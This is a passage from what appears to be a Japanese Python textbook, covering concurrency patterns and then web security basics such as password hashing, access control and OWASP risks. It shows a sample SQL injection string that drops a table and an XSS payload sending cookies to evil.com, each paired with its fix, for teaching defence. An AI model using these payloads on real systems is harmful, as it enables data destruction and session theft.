Pythonのthreadingモジュールを使うと関数を並行して実行できます。しかし同期なしでスレッド間の共有状態は危険です。

import threading

counter = 0  # Shared state — danger!

def increment():
    global counter
    for _ in range(100000):
        counter += 1  # NOT thread-safe!

t1 = threading.Thread(target=increment)
t2 = threading.Thread(target=increment)
t1.start(); t2.start()
t1.join(); t2.join()

print(counter)  # Expected: 200000. Actual: something less!

修正はロック（lock）の使用です：

lock = threading.Lock()
counter = 0

def safe_increment():
    global counter
    for _ in range(100000):
        with lock:  # Only one thread at a time
            counter += 1

非同期/await（Async/Await）

非同期/awaitはPythonの協調マルチタスキングのシステムです。コルーチン（coroutine）（async defで定義）はI/Oを待つ間awaitで一時停止でき、同じスレッドで他のコルーチンを実行させます。

import asyncio

async def fetch_task(task_id):
    print(f"Fetching task {task_id}...")
    await asyncio.sleep(1)  # Non-blocking wait
    print(f"Got task {task_id}")
    return {"id": task_id, "title": f"Task {task_id}"}

async def main():
    # All three start concurrently, wait together
    results = await asyncio.gather(
        fetch_task(1),
        fetch_task(2),
        fetch_task(3),
    )
    # ~1 second total, not 3!
    print(f"Got {len(results)} tasks")

# asyncio.run(main())  # Starts the event loop

イベントループ（event loop）は実行中のすべてのコルーチンを管理します。一つがawaitに達すると、ループに制御を返し、ループが他の準備完了コルーチンを実行します。

マルチプロセシング（Multiprocessing）

CPUバウンドな作業には、multiprocessingが個々のGILを持つ別々のPythonプロセスを生成します。複数のコアで真の並列処理が実現します。

from multiprocessing import Pool

def process_image(path):
    """CPU-heavy image processing."""
    # ... computation ...
    return f"Processed {path}"

# Process 8 images across 4 CPU cores
with Pool(processes=4) as pool:
    results = pool.map(process_image, [
        "img1.png", "img2.png", "img3.png", "img4.png",
        "img5.png", "img6.png", "img7.png", "img8.png",
    ])
# ~2x faster than sequential on 4 cores

よくある並行性のバグ

競合状態（Race condition）：二つのスレッドが同じデータを読み取り・変更・書き込みし、インターリーブによって誤った結果が生じます。修正：ロックまたはアトミック操作を使います。

デッドロック（Deadlock）：スレッドAがロック1を保持してロック2を待ちます。スレッドBがロック2を保持してロック1を待ちます。修正：常に同じグローバルな順序でロックを取得します。

スタベーション（Starvation）：スレッドが他のスレッドに先取りされ続けてリソースへのアクセスを得られません。修正：フェアロックまたは優先度キューを使います。

サンダリングハード（Thundering herd）：多くのスレッドが一つのリソースを争って同時に起動します（例：キャッシュが期限切れになり1000件のリクエストがすべて再生成しようとする）。修正：シングルフライトパターン — 一つのスレッドが再生成し、他は結果を待ちます。

パターン

プロデューサー/コンシューマー（Producer/Consumer）

プロデューサーがキューに作業アイテムを追加し、コンシューマーが処理します。キューが生産と消費を疎結合にします。

import queue
import threading

work_queue = queue.Queue()

def producer():
    for i in range(10):
        work_queue.put(f"task-{i}")
    work_queue.put(None)  # Sentinel: signals completion

def consumer():
    while True:
        item = work_queue.get()
        if item is None:
            break
        print(f"Processing {item}")
        work_queue.task_done()

スレッドプール（Thread Pool）

タスクごとにスレッドを作成する代わりに、固定されたプールを再利用します。Pythonのconcurrent.futures.ThreadPoolExecutorがこれを提供します。

from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_url(url):
    import time
    time.sleep(0.5)
    return f"Content from {url}"

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(fetch_url, u): u
               for u in ["url1", "url2", "url3", "url4", "url5"]}

    for future in as_completed(futures):
        url = futures[future]
        print(f"{url}: {future.result()}")

ファンアウト/ファンイン（Fan-Out / Fan-In）

ファンアウト：タスクを多くの並行サブタスクに分割します。ファンイン：結果を収集して結合します。これはMap-Reduce、並行ウェブスクレイピング、バッチ処理の背後にあるパターンです。

第33章 セキュリティエンジニアリング

重要な概念

すべてのWebアプリケーションは攻撃対象です。SQLインジェクション、パスワードの窃取、APIキーの漏洩—これらは毎日起きています。セキュリティは最後にボルトで留めるものではなく、すべてのコードに織り込まれるマインドセットです。この章では、攻撃者のように考え、エンジニアとして防御する方法を学びます。

認証（Authentication）— あなたは誰ですか？

認証（Authentication）は誰かの身元を確認します。最も一般的な形式はユーザー名とパスワードです。

パスワードのハッシュ化

第一のルール：パスワードを平文で保存しない。データベースが侵害された場合、すべてのユーザーのパスワードが露出します。代わりにハッシュ — 一方向の数学的フィンガープリント — を保存します。

import hashlib
import os

def hash_password(password, salt=None):
    """Hash a password with a random salt."""
    if salt is None:
        salt = os.urandom(16)
    hashed = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations=100000  # Slow on purpose!
    )
    return salt, hashed

def verify_password(password, salt, stored_hash):
    """Verify a password against a stored hash."""
    _, new_hash = hash_password(password, salt)
    return new_hash == stored_hash

# Registration
salt, hashed = hash_password("my_secret_password")
# Store salt + hashed in database (NOT the plaintext password!)

# Login
is_valid = verify_password("my_secret_password", salt, hashed)  # True

主要な概念：

  • ソルト（Salt）：ハッシュ化前に各パスワードに追加されるランダムな値。二人のユーザーが同じパスワードを持っていても、ハッシュは異なります。レインボーテーブル（事前計算されたハッシュの対照表）攻撃も防ぎます。
  • 低速ハッシュ化：bcrypt、scrypt、PBKDF2のようなアルゴリズムは意図的に遅く設計されています。これによりブルートフォース攻撃が現実的でなくなります：一つの推測のハッシュ化にミリ秒かかりますが、数十億の推測には何年もかかります。
  • ハッシュ化は暗号化ではありません：暗号化は可逆的（鍵で復号できる）です。ハッシュ化は一方向（元のデータを復元できない）です。

JWTトークン（JWT Tokens）

JSON Webトークン（JSON Web Tokens / JWT）は認証情報を送信するコンパクトな方法です。JWTには三つのBase64エンコードされた部分があります：header.payload.signature。

OAuth2フロー

OAuth2はユーザーがパスワードをあなたと共有することなく、既存のアカウント（Google、GitHub）を使ってアプリにログインできるようにします。

認可（Authorisation）— 何ができますか？

認証 = 「あなたは誰ですか？」認可（Authorisation） = 「何をすることが許可されていますか？」

ロールベースアクセス制御（Role-Based Access Control / RBAC）

ユーザーはロール（admin、editor、viewer）に割り当てられます。各ロールには特定の権限があります。

PERMISSIONS = {
    "admin":  ["create", "read", "update", "delete", "manage_users"],
    "editor": ["create", "read", "update"],
    "viewer": ["read"],
}

def check_permission(user_role, action):
    allowed = PERMISSIONS.get(user_role, [])
    if action not in allowed:
        raise PermissionError(f"Role '{user_role}' cannot '{action}'")

属性ベースアクセス制御（Attribute-Based Access Control / ABAC）

ABACは複数の属性に基づいて決定を行います：ユーザーの部署、リソースの分類、時間帯。

def can_access_task(user, task):
    """ABAC: access depends on multiple attributes."""
    if user.role == "admin":
        return True
    if task.project_id in user.project_ids:
        return True
    if task.is_public:
        return True
    return False

最小権限の原則（Principle of Least Privilege）：すべてのユーザー、プロセス、コンポーネントに必要最小限の権限だけを与えます。タスクを読み取るだけのAPIに書き込みアクセスは不要です。

暗号化（Encryption）

種類鍵速度使用例

非対称暗号化（RSA）公開鍵 + 秘密鍵のペア低速TLSハンドシェイク、署名

注意

「ハッシュ化は暗号化の一形態」というのは誤解です。暗号化は可逆的 — 正しい鍵で復号できます。ハッシュ化は一方向 — 元のデータを復元できません。パスワードはハッシュ化します（検証するだけでよい）。クレジットカード番号のような機密データは暗号化します（後で読む必要がある）。

OWASPの主要な脆弱性

OWASP（Open Web Application Security Project）は最も重大なウェブセキュリティリスクの一覧を管理しています。必ず理解すべきトップ5を示します。

1. SQLインジェクション（SQL Injection）

攻撃者が入力フィールドに悪意のあるSQLを挿入します。文字列の連結でSQLを構築すると、攻撃者はデータベース全体を読み取り、変更、削除できます。

# VULNERABLE: string concatenation
username = "admin'; DROP TABLE users; --"
query = f"SELECT * FROM users WHERE username = '{username}'"
# Becomes: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
# Your entire users table is deleted!

# SAFE: parameterised query
cursor.execute(
    "SELECT * FROM users WHERE username = ?",
    (username,)
)
# The ? placeholder treats input as DATA, not SQL code

2. 認証の欠陥（Broken Authentication）

弱いパスワード、レート制限の欠如、期限切れにならないトークン、安全でないパスワードリセットフロー。修正：強いパスワードの強制、MFAの使用、トークンの期限設定、ログイン試行のレート制限。

3. クロスサイトスクリプティング（Cross-Site Scripting / XSS）

攻撃者が他のユーザーが閲覧するページにJavaScriptを注入します。スクリプトが被害者のブラウザで実行され、Cookieやセッショントークンを盗みます。

# VULNERABLE: user input directly in HTML
task_title = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
html = f"<h1>{task_title}</h1>"
# The script executes in every viewer's browser!

# SAFE: output encoding (escape HTML characters)
from markupsafe import escape
html = f"<h1>{escape(task_title)}</h1>"
# Renders as visible text, not executable code

4. サーバーサイドリクエストフォージェリ（Server-Side Request Forgery / SSRF）

攻撃者がサーバーを騙して内部サービスへのリクエストを作らせます。アプリがユーザーが指定したURLを取得する場合、攻撃者がhttp://localhost:5432を提供して内部ネットワークを探索するかもしれません。修正：URLを検証してホワイトリスト化し、内部IPレンジをブロックします。

5. セキュリティの設定ミス（Security Misconfiguration）

デフォルトパスワードが変更されない、本番環境でデバッグモードが有効、詳細なスタックトレースがユーザーに表示される、不要なサービスが公開されている。修正：デフォルトを強化し、設定を監査し、デバッグ情報を絶対に公開しない。

  • 入力検証：サーバーですべての入力を検証します。クライアント側の検証はUXです；サーバー側がセキュリティです。クライアントを絶対に信頼しないでください。

演習：パスワードのハッシュ化

hashlibを使ってパスワードのハッシュ化を実装してください。SHA-256と100,000回の反復を使うPBKDF2でhash_password(password, salt)を完成させてください。次に、パスワードが一致する場合のみTrueを返すverify_password(password, salt, expected_hash)を完成させてください。異なるソルトが異なるハッシュを生成することを実証してください。

hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000)を使ってハッシュを作成します。

verify_passwordでは、与えられたパスワードとソルトでhash_passwordを呼び出し、結果をexpected_hashと比較します。一致する場合はTrueを返します。

パスワード文字列をバイトにエンコードすることを忘れずに：password.encode('utf-8')。ソルトはすでにバイトです。
